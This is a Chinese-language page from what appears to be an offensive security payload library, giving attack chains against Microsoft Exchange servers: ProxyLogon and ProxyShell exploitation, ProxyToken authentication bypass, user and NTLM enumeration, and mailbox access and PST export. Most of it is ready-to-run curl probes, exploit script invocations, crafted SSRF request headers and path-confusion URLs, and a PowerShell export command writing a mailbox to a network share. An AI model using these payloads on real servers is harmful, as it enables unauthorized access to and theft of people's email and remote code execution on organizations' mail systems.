# 内网/后渗透 — Exchange 攻击 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ SRC 场景下大多受限,见 [../compliance.md](../compliance.md)
> 涵盖:ProxyLogon / ProxyShell / NTLM Relay / EWS / OAB / Mailbox Export / CVE-2021-26855

---

### ProxyLogon攻击  `proxylogon`
CVE-2021-26855 Exchange SSRF
子类：**ProxyLogon** · tags: `exchange` `proxylogon` `cve-2021-26855`

**前置条件：** Exchange可访问

**攻击链：**

**1. 探测漏洞**  _[linux]_
_检查Exchange版本_
```
curl -k https://exchange.com/owa/auth/x.js
检查Exchange版本
```

**2. 利用脚本**  _[linux]_
_利用ProxyLogon_
```
python proxylogon.py -u https://exchange.com -e admin@domain.com
获取管理员邮箱访问权限
```

**3. 手动利用**
_手动构造请求_
```
POST /owa/auth/x.js HTTP/1.1
Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;
X-ClientId=xxx

构造SSRF请求
```

---

### ProxyShell攻击  `proxyshell`
CVE-2021-34473 Exchange RCE
子类：**ProxyShell** · tags: `exchange` `proxyshell` `cve-2021-34473`

**前置条件：** Exchange可访问

**攻击链：**

**1. 探测漏洞**  _[linux]_
_探测漏洞_
```
curl -k "https://exchange.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com"
检查是否存在漏洞
```

**2. 利用脚本**  _[linux]_
_利用ProxyShell_
```
python proxyshell.py -u https://exchange.com -e admin@domain.com
获取邮箱访问并执行命令
```

**3. 获取邮件**
_访问邮箱_
```
GET /autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com HTTP/1.1
访问邮箱内容
```

---

### Exchange枚举  `exchange-enum`
枚举Exchange服务和配置
子类：**枚举** · tags: `exchange` `enum` `recon`

**前置条件：** Exchange可访问

**攻击链：**

**1. 版本探测**  _[linux]_
_探测Exchange版本_
```
curl -k https://exchange.com/owa/auth/logon.aspx
检查页面源码获取版本信息
```

**2. Autodiscover**  _[linux]_
_Autodiscover枚举_
```
curl -k -u user:pass https://exchange.com/autodiscover/autodiscover.xml
获取Exchange配置信息
```

**3. 邮箱枚举**  _[linux]_
_枚举邮箱用户_
```
python oab.py https://exchange.com
下载离线通讯录枚举用户
```

**4. NTLM泄露**  _[linux]_
_NTLM信息泄露_
```
curl -k https://exchange.com/autodiscover/autodiscover.xml
从WWW-Authenticate头获取域信息
```

---

### ProxyToken攻击  `exchange-proxytoken`
利用Exchange ProxyToken绕过认证
子类：**ProxyToken** · tags: `exchange` `proxytoken` `bypass`

**前置条件：** Exchange服务器；存在漏洞

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
使用ProxyToken工具:
python proxytoken.py -u https://exchange.com -e user@domain.com
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_获取邮箱访问_
```
python proxytoken.py -u https://exchange.com -e user@domain.com -a
获取用户邮箱访问权限
```

**3. 访问邮箱**
_访问EWS接口_
```
curl -k https://exchange.com/ews/Exchange.asmx -H "X-ClientApplication: Test"
绕过认证访问EWS
```

---

### Exchange邮箱访问  `exchange-mailbox-access`
通过各种方式访问Exchange邮箱
子类：**邮箱访问** · tags: `exchange` `mailbox` `access`

**前置条件：** Exchange凭证或漏洞

**攻击链：**

**1. OWA访问**
_OWA Web访问_
```
https://exchange.com/owa
使用凭证登录OWA
查看邮件、日历等
```

**2. EWS访问**  _[linux]_
_EWS API访问_
```
使用Impacket:
python exchanger.py domain/user:password@exchange.com
或使用EWSTools
```

**3. Outlook MAPI**  _[windows]_
_Outlook客户端_
```
配置Outlook连接Exchange
使用MAPI协议访问邮箱
支持邮件、日历、联系人
```

**4. 导出邮箱**  _[windows]_
_导出邮箱_
```
PowerShell:
New-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\server\share\user.pst"
导出邮箱为PST文件
```

---



---

← 回 [00-index.md](00-index.md) · 上一篇:[`17-persistence.md`](17-persistence.md) · 下一篇:[`19-adcs.md`](19-adcs.md)
